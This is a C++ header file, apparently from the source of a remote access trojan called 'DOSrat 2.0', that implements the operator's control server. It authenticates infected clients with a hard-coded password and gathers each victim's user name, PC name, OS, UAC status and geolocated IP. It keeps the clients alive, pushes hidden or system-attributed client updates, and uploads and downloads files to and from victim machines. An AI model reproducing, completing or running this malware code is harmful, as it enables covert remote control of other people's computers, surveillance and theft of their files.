#pragma once

class Comunicazioni
{
private:
	static void TerminaConnessione(int ID, SOCKET Sock)
	{
		TcpIP::SetTimeout(0, Sock);
		Clients[ID].Kill();
	}

public:
	static bool Inizializzazione(int ID, SOCKET Sock)
	{
		char Pass[10]; // DOSrat2.0
		string Buff;

		TcpIP::SetTimeout(10000, Sock);

		if (recv(Sock, Pass, sizeof(Pass), 0) == SOCKET_ERROR)
		{
			TerminaConnessione(ID, Sock);
			return false;
		}
		if ((string)Pass != "DOSrat2.0")
		{
			TerminaConnessione(ID, Sock);
			return false;
		}
		if (send(Sock, "DOSrat2.0", 10, 0) == SOCKET_ERROR)
		{
			TerminaConnessione(ID, Sock);
			return false;
		}

		TcpIP::SetTimeout(0, Sock);
		if (!TcpIP::RecvString(Sock, Buff))
		{
			TerminaConnessione(ID, Sock);
			return false;
		}

		Json data = Json::parse(Buff);

		Clients[ID].IsConnected = true;
		Clients[ID].info.InstallPath = data["InstallPath"];
		Clients[ID].info.OS = data["OS"];
		Clients[ID].info.PCname = data["PCname"];
		Clients[ID].info.UAC = data["UAC"];
		Clients[ID].info.UserName = data["UserName"];
		Clients[ID].info.Versione = data["Versione"];
		Clients[ID].info.CompatibleVer = (data["VersioneCompatibile"].is_null()) ? 0 : (int)data["VersioneCompatibile"];

		Clients[ID].info.IP = TcpIP::GetIP(Sock);
		IPlocation::GetInfoFromIP(Clients[ID].info.IP, Clients[ID].info.Location);

		Clu.AggiornaTitolo();

		return true;
	}

	static void AccettaConnessioni(TcpIP& Server, bool& mostraNotifiche)
	{
		SystemUtils su;
		DirUtils du;
		int c = 0;

		su.ShowNotifyIcon("DOSrat 2.0");

		while (true)
		{
			if (!ServerLoopController)
				break;

			for (int i = 0; i < MAX_CLIENTS; i++)
			{
				if (!Clients[i].IsConnected)
				{
					c = i;
					i = MAX_CLIENTS;
				}
			}

			if (Server.WaitConn(Clients[c].sock, 1000))
				if (Inizializzazione(c, Clients[c].sock) && mostraNotifiche)
					su.SendNotify("Client Connesso", "IP: " + Clients[c].info.IP + "\nPC: " + Clients[c].info.PCname + "\nUser: " + Clients[c].info.UserName + "\nOS: " + Clients[c].info.OS);
		}

		su.HideNotifyIcon();

		return;
	}

	static void VerificaConnessioni()
	{
		while (true)
		{
			Sleep(500);

			if (!ServerLoopController)
				break;

			for (int i = 0; i < MAX_CLIENTS; i++)
			{
				Sleep(2);

				if (!ServerLoopController)
					break;

				if (Clients[i].IsConnected && !Clients[i].InTask)
				{
					TcpIP::SetTimeout(500, Clients[i].sock);

					if (!TcpIP::SendString(Clients[i].sock, "keepalive"))
					{
						Clients[i].Kill();
						Clu.AggiornaTitolo();
					}
					else if (Clients[i].info.CompatibleVer >= 5)
					{
						string tmp;

						if (!TcpIP::RecvString(Clients[i].sock, tmp) || tmp == "")
						{
							Clients[i].Kill();
							Clu.AggiornaTitolo();
						}
					}

					TcpIP::SetTimeout(0, Clients[i].sock);
				}
			}
		}

		return;
	}

	static bool RestartServer(TcpIP& Server, int Port, bool& mostraNotifiche)
	{
		ServerLoopController = false;

		Sleep(1000);

		for (int i = 0; i < MAX_CLIENTS; i++)
			if (Clients[i].IsConnected)
			{
				Clients[i].Kill();
				Clu.AggiornaTitolo();
			}

		Server.Stop();
		Server.Port = Port;
		if (Server.StartServer() != 0)
			return false;

		Sleep(1000);

		ServerLoopController = true;

		thread Aconn(AccettaConnessioni, ref(Server), ref(mostraNotifiche));
		thread Vconn(VerificaConnessioni);
		Aconn.detach();
		Vconn.detach();

		return true;
	}

	static bool UpdateClient(SOCKET Sock, string FileContent, bool Hidden, bool System)
	{
		string Buff;
		Json j;

		if (!TcpIP::SendString(Sock, "updateclient"))
			return false;

		if (!TcpIP::SendString(Sock, FileContent))
			return false;

		j["Hidden"] = Hidden;
		j["System"] = System;

		if (!TcpIP::SendString(Sock, j.dump()))
			return false;

		TcpIP::RecvString(Sock, Buff);

		return (Buff == "OK");
	}
	
	static string PingPong(SOCKET Sock, string Send)
	{
		string Buff = "";
		
		if (!TcpIP::SendString(Sock, Send))
			return "";
		
		if (!TcpIP::RecvString(Sock, Buff))
			return "";
		
		return Buff;
	}

	static bool UploadFileWithLoading(SOCKET Sock, string FileName, string FilePath, int BarSize = 20)
	{
		DirUtils du;
		ifstream infile;
		CLInterface cli;
		long long FileSize = du.GetSizeOfFile(FilePath);
		int ChunkSize = 64000;
		string Buff(ChunkSize, '\0');

		if (!TcpIP::SendString(Sock, FileName))
			return false;

		if (!TcpIP::SendString(Sock, to_string(FileSize)))
			return false;

		infile.open(FilePath.c_str(), std::ios::binary);
		if (!infile.is_open())
		{
			if (!TcpIP::SendString(Sock, "KO"))
				return false;
			return true;
		}
		else
		{
			if (!TcpIP::SendString(Sock, "OK"))
				return false;
		}

		if (FileSize > ChunkSize)
		{
			int ChunkNumber = (FileSize / ChunkSize) + (FileSize % ChunkSize == 0 ? 0 : 1);

			cli.FullBar(BarSize);

			for (int i = 0; i < ChunkNumber; i++)
			{
				Buff.clear();

				if (i + 1 == ChunkNumber)
					Buff = string((int)(FileSize - (ChunkSize * (ChunkNumber - (FileSize % ChunkSize == 0 ? 0 : 1)))), '\0');
				else
					Buff = string(ChunkSize, '\0');

				infile.read(&Buff[0], Buff.size());

				if (!TcpIP::SendString(Sock, Buff))
				{
					infile.close();
					cli.StopBar();
					return false;
				}

				cli.LoadingPercentage = (int)((float)((i + 1) / (float)ChunkNumber) * 100);
			}

			Buff.clear();
			cli.StopBar();
			infile.close();
		}
		else if (FileSize > 0)
		{
			infile.close();
			cli.FullBar(BarSize);

			if (!TcpIP::SendString(Sock, du.GetBinaryFileContent(FilePath)))
			{
				cli.StopBar();
				return false;
			}

			cli.LoadingPercentage = 100;
			cli.StopBar();
		}

		infile.close();
		return true;
	}

	static short DownloadFileWithLoading(SOCKET Sock, string LocalFolder, int BarSize = 20)
	{
		DirUtils du;
		CLInterface cli;
		string strFileSize;
		string FileName;
		string Buff = "";
		int ChunkSize = 64000;
		short rtnValue = 0;

		if (!TcpIP::RecvString(Sock, FileName))
			return 1;

		if (!TcpIP::RecvString(Sock, strFileSize))
			return 1;

		if (!TcpIP::RecvString(Sock, Buff))
			return 1;

		if (Buff == "KO")
			return 2;

		Buff.clear();

		if (!du.CheckDir(LocalFolder))
			if (!du.MakeDir(LocalFolder))
				rtnValue = 2;

		LocalFolder += "\\Downloads";

		if (!du.CheckDir(LocalFolder))
			if (!du.MakeDir(LocalFolder))
				rtnValue = 2;

		FileName = LocalFolder + "\\" + FileName;

		if (du.CheckFile(FileName))
			du.DelFile(FileName);

		if (!du.WriteFile(FileName))
			rtnValue = 2;

		long long FileSize = stoll(strFileSize);

		if (FileSize > ChunkSize)
		{
			int ChunkNumber = (FileSize / ChunkSize) + (FileSize % ChunkSize == 0 ? 0 : 1);

			cli.FullBar(BarSize);

			for (int i = 0; i < ChunkNumber; i++)
			{
				if (!TcpIP::RecvString(Sock, Buff))
				{
					cli.StopBar();
					return 1;
				}

				if (!du.AppendToBinaryFile(FileName, Buff))
					rtnValue = 2;

				Buff.clear();

				cli.LoadingPercentage = (int)((float)((i + 1) / (float)ChunkNumber) * 100);
			}

			cli.StopBar();
		}
		else if (FileSize > 0)
		{
			cli.FullBar(BarSize);

			if (!TcpIP::RecvString(Sock, Buff))
			{
				cli.StopBar();
				return 1;
			}

			if (!du.AppendToBinaryFile(FileName, Buff))
				rtnValue = 2;

			cli.LoadingPercentage = 100;
			cli.StopBar();
		}

		return rtnValue;
	}
};